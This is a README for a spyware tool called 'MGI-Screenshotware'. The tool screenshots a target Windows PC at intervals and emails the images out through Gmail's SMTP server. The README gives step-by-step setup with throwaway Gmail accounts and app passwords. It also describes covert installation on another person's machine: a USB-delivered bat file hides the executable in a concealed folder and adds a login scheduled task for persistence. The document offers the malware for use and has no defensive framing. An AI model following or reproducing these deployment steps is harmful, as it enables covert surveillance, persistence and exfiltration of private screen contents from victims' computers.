# MGI-Screenshotware
a spyware designed to take screenshots of a target Windows PC at set intervals and use the Google SMTP server to deliver them to the client anywhere.

Instructions: 
1.Create two new gmail emails. or use existing ones if you want to take the risk.

2.Enable SMTP on the sending email.

3.Create a custom app password for this email.

4.In the code fill in the sending email username and password (<-- custom app password goes here)

5.Compile the code in a C# Windows forms app of the smallest size.

6.Go to Debug and run the main .exe this creates.

(Alternatively just test the code in the visual studio IDE)


To use on another system you will have to copy this file to the target manually and install it like so:

1.Copy this .exe to a folder.

2.Create a bat file in the same folder that copies this exe file to a hidden directory of your choice.

3.Also add a scheduler task to run this program on login within the same bat file.

4.Test the .bat file on your own PC

5.Copy this entire folder onto a USB, plug it into a target system and run the bat file.


If all goes well the .exe should be copied to a folder within seconds and the task should be scheduled.
Voila! Now on next boot this program will start screenshotting and sending it your way.
